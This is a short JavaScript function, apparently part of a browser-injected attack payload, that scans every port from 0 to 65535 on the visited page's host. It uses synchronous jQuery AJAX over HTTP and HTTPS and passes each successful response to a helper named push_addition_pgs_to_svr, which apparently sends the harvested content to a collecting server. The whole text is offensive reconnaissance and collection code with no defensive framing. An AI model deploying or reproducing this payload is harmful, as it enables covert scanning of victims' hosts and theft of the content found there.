function scan_all_ports(host) {
    for (let port=0; port<=65535; port++) {
        $.ajax({
            timeout: 5,
            url: ("http://" + document.location.hostname + ":" + port),
            async: false,
            success: function (text) {
                var resp = text;
                push_addition_pgs_to_svr(("http://" + document.location.hostname + ":" + port), resp, "ports");
            }
        });
        $.ajax({
            timeout: 5,
            url: ("https://" + document.location.hostname + ":" + port),
            async: false,
            success: function (text) {
                var resp = text;
                push_addition_pgs_to_svr(("https://" + document.location.hostname + ":" + port), resp, "ports");
            }
        });
    }
}
